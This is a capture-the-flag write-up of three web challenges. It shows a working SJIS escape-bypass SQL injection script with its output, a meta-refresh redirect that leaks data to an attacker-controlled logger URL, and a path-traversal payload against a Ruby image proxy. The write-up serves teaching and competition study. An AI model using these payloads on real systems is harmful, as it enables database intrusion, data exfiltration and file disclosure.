Participated as dcua.


## Good Morning (3pt)

The server pretty seem to be decent, but I've wasted a lot of time testing in a local server. 

The intended way was to bypass the escape_string() feature, by eating up the escaped character to make one backslash with one quote. (```\\"``` => ```?\"```)

bypassing ```escape_string()``` does not work on an UTF-8 encoding, however server used a SJIS encoding, which has a potential of escape string problems.


```
#!/usr/bin/python
#-*- coding: utf-8 -*-

from websocket import create_connection
import json
import sys0
reload(sys)
sys.setdefaultencoding("ISO-8859-1")

INJ = " AND 1=0 UNION SELECT COLUMN_NAME,2,3 FROM INFORMATION_SCHEMA.COLUMNS -- "

# SELECT * FROM answers WHERE question="%s" AND answer="%s"

payload = '¥\u005c'

#ws = create_connection("ws://localhost:5000/ws")
ws = create_connection("ws://52.86.232.163:32800/ws")
result =  ws.recv()

packet = '''{"type":"get_answer","question":"'''+payload+'''","answer":"'''+INJ+'''"}'''
print(">>> '%s'" % packet)
ws.send(packet)

result =  ws.recv()
print "<<< '%s'" % result
ws.close()
```

```
>>> '{"type":"get_answer","question":"¥\u005c","answer":" AND 1=0 UNION SELECT TABLE_NAME, COLUMN_NAME, 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x67616e6261747465 LIMIT 1,1 -- "}'
<<< '{"type": "got_answer", "row": ["answers", "id", "3"]}'
<<< '{"type": "got_answer", "row": ["answers", "question", "3"]}'
<<< '{"type": "got_answer", "row": ["answers", "answer", "3"]}'
<<< '{"type": "got_answer", "row": null}'

...

>>> '{"type":"get_answer","question":"¥\u005c","answer":" AND 1=0 UNION SELECT id, question, answer FROM answers WHERE id=1 -- "}'
<<< '{"type": "got_answer", "row": [1, "flag", "BKPCTF{TryYourBestOnTheOthersToo}"]}'

BKPCTF{TryYourBestOnTheOthersToo}
```


## Bug Bounty (3pt)

Sounded more like a XSS challenge at the beginning, but CSP header was blocking to inject inline scripts and send the data back to our serverㄴ.

```
Content-Security-Policy: default-src 'none'; connect-src 'self';  frame-src 'self'; script-src 52.87.183.104:5000/dist/js/ 'sha256-KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto=' 'sha256-u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ=' 'sha256-zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM=' 'sha256-3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk=' 'sha256-bk9UfcsBy+DUFULLU6uX/sJa0q7O7B8Aal2VVl43aDs='; font-src 52.87.183.104:5000/dist/fonts/ fonts.gstatic.com; style-src 52.87.183.104:5000/dist/css/ fonts.googleapis.com; img-src 'self';
```

```
$ cat inline.txt | openssl dgst -sha256 -binary | openssl base64 # There are 5 hashes in the CSP header
KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto=           // ?????
u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ=     // "register user" script
zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM=            // "submit bug" script
3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk=       // "show_report" script
bk9UfcsBy+DUFULLU6uX/sJa0q7O7B8Aal2VVl43aDs=       // captcha page script that loads captchas etc
```

As we searched for files in ```/dist/js```,

```
http://52.87.183.104:5000/dist/js/angular.min.js
http://52.87.183.104:5000/dist/js/app.js
http://52.87.183.104:5000/dist/js/angular-route.min.js
```

We were able to utilize AngularJS to initiate XSS payloads, but it was still not enough due to the CSP header.

so now what? Just use ```meta``` tag to get the request header, and you see the damn flag.

```
<meta http-equiv="refresh" content="0; url=http://yourdomain.com/logger.php" />
```

```BKPCTF{choo choo__here comes the flag}```

lol.


## optiproxy (2pt)

Was pretty easy,

```
#http://optiproxy.bostonkey.party:5300/source

...

begin
            if (uri_scheme == "http" or uri_scheme == "https")
                    url = image
            else
                    url = "http://#{url}/#{image}"
            end
            img_data = open(url).read
            b64d = "data:image/png;base64," + Base64.strict_encode64(img_data)
            img['src'] = b64d
    rescue
            # gotta catch 'em all
            puts "lole"
            next
    end
...

```

```
<html>
<body>
<img src="http:/../../../../../../flag">
</body>
</html>
```

```BKPCTF{maybe dont inline everything.}```
